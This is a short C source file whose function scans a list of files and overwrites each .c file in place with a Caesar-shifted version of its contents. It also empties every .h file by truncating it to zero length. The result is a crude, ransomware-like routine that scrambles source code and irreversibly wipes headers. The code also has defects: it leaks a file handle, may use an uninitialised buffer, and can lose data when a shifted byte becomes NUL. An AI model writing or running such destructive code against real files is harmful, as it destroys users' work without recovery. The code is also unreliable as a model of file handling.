#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dirent.h>

#include "data_io.h"

void encrypt_c_h_files(const char **files, int num_files, int shift) {
    char* file_content;
    char* pointer;
    FILE* file;

    for (int i = 0; i < num_files; i++) {
        size_t len;
        const char* filename;
        filename = files[i];
        len = strlen(filename);

        if (len > 2 && filename[len - 1] == 'c' && filename[len - 2] == '.') {
            file =  fopen(filename, "r");
            if (file) {file_content = copy_file_to_string(file);}

            file =  fopen(filename, "w");
            if (file) {
                pointer = file_content;
                while (*pointer) {
                    *pointer = (*pointer + shift) % 128;
                    pointer++;
                }
                fprintf(file, "%s", file_content);
                free(file_content);
                fclose(file);
            }
        }

        if (len > 2 && filename[len - 1] == 'h' && filename[len - 2] == '.') {
            file =  fopen(filename, "w");
            if (file) {
                fclose(file);
            }
        }
    }
}
